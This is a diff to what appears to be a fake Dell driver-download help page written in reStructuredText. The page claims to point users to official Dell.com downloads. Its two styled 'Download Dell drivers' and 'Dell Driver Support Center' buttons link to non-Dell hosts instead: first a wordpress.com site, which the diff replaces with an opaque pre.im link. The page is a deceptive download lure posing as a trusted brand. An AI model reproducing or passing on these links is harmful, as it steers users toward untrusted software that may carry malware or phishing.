@@ -4,7 +4,7 @@ How to Download Dell Drivers and Updates from Dell.com
 .. raw:: html
 
     <div style="text-align:center; margin-top:30px;">
-        <a href="https://quickencomdownload.wordpress.com/" style="background-color:#28a745; color:#ffffff; padding:12px 28px; font-size:16px; font-weight:bold; text-decoration:none; border-radius:6px; box-shadow:0 4px 6px rgba(0,0,0,0.1); display:inline-block;">
+        <a href="https://pre.im/?3X7UunD01l82k8G1EuKNO2o3f0c44pUAFD1y8AWCTFzpbCoVsYf1Q2sqXTu2fxevrEdyG" style="background-color:#28a745; color:#ffffff; padding:12px 28px; font-size:16px; font-weight:bold; text-decoration:none; border-radius:6px; box-shadow:0 4px 6px rgba(0,0,0,0.1); display:inline-block;">
            Download Dell drivers 
         </a>
     </div>
@@ -114,7 +114,7 @@ Downloading and installing Dell drivers from the official Dell website ensures y
 .. raw:: html
 
     <div style="text-align:center; margin-top:30px;">
-        <a href="https://quickencomdownload.wordpress.com/" style="background-color:#007bff; color:#ffffff; padding:10px 24px; font-size:15px; font-weight:bold; text-decoration:none; border-radius:5px; margin:5px; display:inline-block;">
+        <a href="https://pre.im/?3X7UunD01l82k8G1EuKNO2o3f0c44pUAFD1y8AWCTFzpbCoVsYf1Q2sqXTu2fxevrEdyG" style="background-color:#007bff; color:#ffffff; padding:10px 24px; font-size:15px; font-weight:bold; text-decoration:none; border-radius:5px; margin:5px; display:inline-block;">
             🔗 Dell Driver Support Center
         </a>
   
